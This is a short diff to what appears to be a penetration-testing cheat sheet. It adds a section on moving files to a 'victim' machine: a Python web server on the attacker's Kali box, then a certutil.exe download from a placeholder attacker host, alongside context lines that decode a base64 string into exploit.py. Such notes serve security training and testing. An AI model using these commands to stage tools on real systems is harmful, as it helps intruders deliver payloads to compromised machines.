@@ -65,6 +65,14 @@ Using MSF. Start MSF before starting these steps:
 	
 	victim:
 	2. echo "base64string==" | base64 -d >> exploit.py
+	
+#Certutil
+		
+	local system:
+	1. python -m SimpleHTTPServer 80
+	
+	victim:
+	2. certutil.exe -urlcache -split -f "http://ip.for.kali.box/file-to-get.zip" name-to-save-as.zip
 
 
 LFI / RFI
